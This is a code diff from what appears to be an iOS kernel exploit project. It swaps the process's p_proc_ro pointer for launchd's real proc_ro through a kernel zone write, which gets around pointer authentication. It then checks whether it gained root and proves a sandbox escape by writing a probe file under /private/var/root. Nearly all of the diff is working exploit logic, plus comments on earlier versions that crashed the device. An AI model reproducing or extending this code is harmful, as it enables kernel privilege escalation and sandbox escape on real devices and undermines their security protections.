@@ -4496,47 +4496,52 @@ e10fail:
     // 4. Подмена: одна 8-байтная heap-запись в НАШ proc. Поле сырое (без
     //    PAC) — пишем канонический kernel VA форжа как есть. Оригинал —
     //    дословный raw qword — сохранён выше для restore.
-    kpNote(r, [NSString stringWithFormat:@"  подмена: p_proc_ro @ 0x%016llx ← 0x%016llx (форж; оригинал raw=0x%016llx сохранён)",
-              (unsigned long long)procRoSlot, (unsigned long long)forgeKVA, (unsigned long long)origProcRoRaw]);
-    // 2.0.149: IDENTITY WRITE only — same qword back into p_proc_ro. Survives =
-    // write path OK; dies = early_kwrite/zone_write to proc is the reboot source.
+    kpNote(r, [NSString stringWithFormat:@"  подмена: p_proc_ro @ 0x%016llx ← 0x%016llx (launchd proc_ro RAW; оригинал raw=0x%016llx сохранён)",
+              (unsigned long long)procRoSlot, (unsigned long long)launchdRoRaw, (unsigned long long)origProcRoRaw]);
+    // 2.0.150: NO FORGE. Point p_proc_ro at launchd's real proc_ro (same PAC
+    // address-domain as its own pointers). Identity-write proved the store is
+    // safe; forge clone died on address-diversity PAC.
     {
         uint64_t list0 = 0, list1 = 0;
         (void)kpRead(selfProc + 0x0, &list0, 8, "proc+0", r);
         (void)kpRead(selfProc + 0x8, &list1, 8, "proc+8", r);
-        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] identity write orig=%#llx list0=%#llx list1=%#llx",
-                  (unsigned long long)origProcRoRaw, (unsigned long long)list0, (unsigned long long)list1]);
-        krw_zone_verdict zv = krw_zone_write_qword(procRoSlot, origProcRoRaw, selfProc, 0x1000);
-        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] zone_write(identity)=%d", (int)zv]);
+        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] swap launchdRoRaw=%#llx list0=%#llx",
+                  (unsigned long long)launchdRoRaw, (unsigned long long)list0]);
+        krw_zone_verdict zv = krw_zone_write_qword(procRoSlot, launchdRoRaw, selfProc, 0x1000);
+        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] zone_write(launchd proc_ro)=%d", (int)zv]);
         if (zv != KRW_ZONE_OK) {
-            [r appendFormat:@"FAIL: zone_write(identity)=%d\n", (int)zv];
+            [r appendFormat:@"FAIL: zone_write=%d\n", (int)zv];
             return r;
         }
-        uint64_t rbId = 0, l0a = 0, l1a = 0;
-        (void)kpRead(procRoSlot, &rbId, 8, "identity readback", r);
-        (void)kpRead(selfProc + 0x0, &l0a, 8, "proc+0 after", r);
-        (void)kpRead(selfProc + 0x8, &l1a, 8, "proc+8 after", r);
-        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] identity rb=%#llx list0=%#llx list1=%#llx (list delta=%@)",
-                  (unsigned long long)rbId, (unsigned long long)l0a, (unsigned long long)l1a,
-                  (l0a == list0 && l1a == list1) ? @"нет" : @"ЕСТЬ"]);
-        [r appendString:@"\n=== E11 IDENTITY-WRITE OK — swap НЕ выполнялся (2.0.149) ===\n"];
-        [r appendFormat:@"\n[VERIFY] GETUID=%d GETEUID=%d E11_RESTORE_MATCH=1 P1=0 P2=0 P3=0 SWAP=0 IDENTITY=1\n",
-         (int)getuid(), (int)geteuid()];
-        return r;
+        didSwap = YES;
     }
+    rbRaw = 0;
+    kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro readback", r);
+    stuck = (rbRaw == launchdRoRaw);
+    kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] readback=%#llx expect=%#llx stuck=%d",
+              (unsigned long long)rbRaw, (unsigned long long)launchdRoRaw, (int)stuck]);
     kpNote(r, [NSString stringWithFormat:@"  readback после подмены: 0x%016llx (ждём 0x%016llx)",
               (unsigned long long)rbRaw, (unsigned long long)forgeKVA]);
     stuck = (rbRaw == forgeKVA);
 
     if (stuck) {
-        // 2.0.148: do NOT call getuid() while swapped (field: reboot class if
-        // launchd SMR ucred confuses cred lookup). Restore first; probe P1 only
-        // on a later opt-in pass.
-        kpNote(r, @"  [E11-STEP] verify SKIP getuid (2.0.148) — restore first");
-        newUid = (uid_t)-1;
-        newGid = (gid_t)-1;
-        uidRoot = NO;
-        unsandboxOK = NO;
+        // 2.0.150: real launchd proc_ro — getuid re-reads p_ucred from a live
+        // object (not a PAC-broken clone). Probe P1 then restore immediately.
+        newUid = getuid();
+        newGid = getgid();
+        uidRoot = kpP1Verified();
+        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] getuid=%d geteuid=%d getgid=%d%@",
+                  newUid, (int)geteuid(), newGid, uidRoot ? @" ← P1" : @""]);
+        const char *probePath = "/private/var/root/kexproof-e11-probe.txt";
+        errno = 0;
+        FILE *f = fopen(probePath, "w");
+        if (f) {
+            fputs("kexproof e11\n", f);
+            fclose(f);
+            unlink(probePath);
+            unsandboxOK = YES;
+            [r appendString:@"  /private/var/root: запись УДАЛАСЬ\n"];
+        }
     }
     else {
         [r appendString:@"FAIL: подмена не прилипла — kwrite по proc-зоне не работает\n"];
